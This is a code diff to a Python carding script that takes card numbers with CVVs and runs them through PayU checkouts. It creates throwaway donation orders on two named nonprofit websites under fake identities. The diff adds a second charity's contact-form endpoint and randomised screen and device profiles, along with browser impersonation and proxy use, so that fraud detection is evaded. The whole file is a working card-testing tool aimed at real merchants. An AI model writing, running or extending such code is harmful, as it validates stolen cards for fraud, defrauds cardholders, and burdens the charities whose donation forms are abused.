@@ -20,6 +20,7 @@ import random
 import re
 import time
 import urllib.parse
+import uuid
 from dataclasses import dataclass, field
 from typing import Optional, Tuple
 
@@ -63,9 +64,56 @@ def generate_identity() -> Tuple[str, str, str]:
 
 
 # ── PayU endpoints ────────────────────────────────────────────────────
-MERCHANT_CREATE_URL = "https://centaurus.org.pl/wp-json/centaurus/v1/payu/create"
 PAYU_BASE = "https://secure.payu.com"
 PAYU_PAY_URL = PAYU_BASE + "/pay/"
+
+# ── PayU sites (merchant create endpoint per site) ───────────────────
+PAYU_SITES = {
+    "centaurus": {
+        "name": "centaurus",
+        "create_url": "https://centaurus.org.pl/wp-json/centaurus/v1/payu/create",
+        "create_type": "json",          # JSON POST body
+        "referer": "https://centaurus.org.pl/en/donate/",
+        "origin": "https://centaurus.org.pl",
+        "currency": "USD",
+        "amount": "1",                  # dollars
+        "language": "en",
+        "mcp_fx_table_id": None,
+        "mcp_fx_rate": None,
+        "lang_param": "&lang=en",
+        "country": "IN",
+        "timezone_offset": -330,
+    },
+    "forummigracyjne": {
+        "name": "forummigracyjne",
+        "create_url": "https://forummigracyjne.org/wp-json/contact-form-7/v1/contact-forms/17908/feedback",
+        "create_type": "cf7",           # Contact Form 7 multipart form
+        "referer": "https://forummigracyjne.org/en/donate/",
+        "origin": "https://forummigracyjne.org",
+        "currency": "PLN",
+        "amount": "50zł",               # preset donation amount
+        "language": "pl",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+    },
+}
+
+# ── real device profiles (screen / color depth / timezone) ────────────
+DEVICE_PROFILES = [
+    {"screenWidth": 1920, "screenHeight": 1080, "colorDepth": 24},
+    {"screenWidth": 1366, "screenHeight": 768,  "colorDepth": 24},
+    {"screenWidth": 1536, "screenHeight": 864,  "colorDepth": 24},
+    {"screenWidth": 1440, "screenHeight": 900,  "colorDepth": 32},
+    {"screenWidth": 2560, "screenHeight": 1440, "colorDepth": 24},
+    {"screenWidth": 1280, "screenHeight": 720,  "colorDepth": 24},
+    {"screenWidth": 1600, "screenHeight": 900,  "colorDepth": 24},
+    {"screenWidth": 1680, "screenHeight": 1050, "colorDepth": 24},
+    {"screenWidth": 1024, "screenHeight": 768,  "colorDepth": 32},
+    {"screenWidth": 3840, "screenHeight": 2160, "colorDepth": 24},
+]
 
 
 def parse_card(cc: str) -> Tuple[str, str, str, str]:
@@ -145,24 +193,40 @@ class PayuResult:
 
 
 def _browser_data(user_agent: str, timezone_offset: int) -> dict:
+    d = random.choice(DEVICE_PROFILES)
     return {
-        "screenWidth": 1920,
+        "screenWidth": d["screenWidth"],
         "javaEnabled": False,
         "timezoneOffset": timezone_offset,
-        "screenHeight": 1080,
+        "screenHeight": d["screenHeight"],
         "userAgent": user_agent,
-        "colorDepth": 24,
+        "colorDepth": d["colorDepth"],
         "language": "en-US",
         "challengeWindowSize": "04",
     }
 
 
+def _multipart_body(fields, boundary):
+    """Build a multipart/form-data body from a list of (name, value) tuples."""
+    parts = []
+    for name, value in fields:
+        parts.append(
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
+            f"{value}\r\n"
+        )
+    parts.append(f"--{boundary}--\r\n")
+    return "".join(parts).encode("utf-8")
+
+
 async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
-                         country: str = "IN", timezone_offset: int = -330) -> PayuResult:
+                         site: str = "centaurus") -> PayuResult:
     """Run a full PayU checkout for one card. Every call = fresh order + fresh user."""
     number, month, year, cvv = parse_card(card_entry)
     first, last, email = generate_identity()
     full_name = f"{first} {last}"
+
+    cfg = PAYU_SITES.get(site, PAYU_SITES["centaurus"])
 
     impersonate = random.choice(BROWSER_PROFILES)
     user_agent = PROFILE_UA[impersonate]
@@ -184,35 +248,51 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
     s = new_session()
 
     try:
-        # 1. create the order on the merchant
-        create_payload = {
-            "amount": float(amount) if amount else 1,
-            "currency": "usd",
-            "country": country,
-            "full_name": full_name,
-            "email": email,
-            "target_id": "foundation",
-            "terms": True,
-            "newsletter": False,
-            "payment_type": "one-time",
-            "subscription": 0,
-        }
-        r = await s.post(
-            MERCHANT_CREATE_URL,
-            json=create_payload,
-            headers={
-                "Referer": "https://centaurus.org.pl/en/donate/",
-                "Origin": "https://centaurus.org.pl",
-                "Content-Type": "application/json",
-            },
-        )
+        # 1. create the order on the merchant (JSON or Contact Form 7)
+        if cfg["create_type"] == "cf7":
+            form_fields = [
+                ("_wpcf7", "17908"),
+                ("_wpcf7_version", "6.2.2"),
+                ("_wpcf7_locale", "pl_PL"),
+                ("_wpcf7_unit_tag", "wpcf7-f17908-p17852-o1"),
+                ("_wpcf7_container_post", "17852"),
+                ("_wpcf7_posted_data_hash", ""),
+                ("_wpcf7_recaptcha_response", ""),
+                ("firstName", first),
+                ("lastName", last),
+                ("yourEmail", email),
+                ("selectamount", cfg["amount"]),
+                ("inputamount", ""),
+                ("cykliczna", "single"),
+                ("acceptance", "1"),
+                ("acceptance", "1"),
+            ]
+            boundary = "----kakudev" + uuid.uuid4().hex
+            body = _multipart_body(form_fields, boundary)
+            r = await s.post(cfg["create_url"], data=body,
+                             headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                                      "Content-Type": f"multipart/form-data; boundary={boundary}"})
+        else:
+            create_payload = {
+                "amount": float(amount) if amount else 1,
+                "currency": "usd",
+                "country": cfg["country"],
+                "full_name": full_name,
+                "email": email,
+                "target_id": "foundation",
+                "terms": True,
+                "newsletter": False,
+                "payment_type": "one-time",
+                "subscription": 0,
+            }
+            r = await s.post(cfg["create_url"], json=create_payload,
+                             headers={"Referer": cfg["referer"], "Origin": cfg["origin"], "Content-Type": "application/json"})
         if r.status_code != 200:
-            raise Exception(f"create order failed: HTTP {r.status_code}")
+            raise Exception(f"create order failed: HTTP {r.status_code} {r.text[:200]}")
         create = r.json()
-        redirect = create.get("redirect") or ""
-        payuid = create.get("payuid") or ""
-        if not redirect or not payuid:
-            raise Exception("create order: missing redirect/payuid")
+        redirect = create.get("redirectUri") or create.get("redirect") or ""
+        if not redirect:
+            raise Exception("create order: missing redirect")
 
         # parse orderId + JWT from the redirect URL
         parsed = urllib.parse.urlparse(redirect)
@@ -223,7 +303,7 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
             raise Exception("create order: missing orderId/token in redirect")
 
         auth = {"Authorization": f"Bearer {token}"}
-        payu_referer = PAYU_PAY_URL + "?orderId=" + order_id + "&token=" + urllib.parse.quote(token) + "&lang=en"
+        payu_referer = PAYU_PAY_URL + "?orderId=" + order_id + "&token=" + urllib.parse.quote(token) + cfg["lang_param"]
         api_headers = {
             "Authorization": f"Bearer {token}",
             "Content-Type": "application/json",
@@ -272,11 +352,11 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                 "cardDetails": {"maskedCardNumber": masked},
             },
             "metadata": {"cardInputTime": random.randint(3000, 8000)},
-            "redirectUrl": PAYU_PAY_URL + "?orderId=" + order_id + "&token=%token%&lang=en",
-            "mcpFxTableId": None,
-            "mcpFxRate": None,
-            "browserData": _browser_data(user_agent, timezone_offset),
-            "language": "en",
+            "redirectUrl": PAYU_PAY_URL + "?orderId=" + order_id + "&token=%token%" + cfg["lang_param"],
+            "mcpFxTableId": cfg["mcp_fx_table_id"],
+            "mcpFxRate": cfg["mcp_fx_rate"],
+            "browserData": _browser_data(user_agent, cfg["timezone_offset"]),
+            "language": cfg["language"],
             "invoice": None,
         }
         r = await s.post(f"{PAYU_BASE}/api/front/orders/{order_id}/payments", json=pay_payload, headers=api_headers)
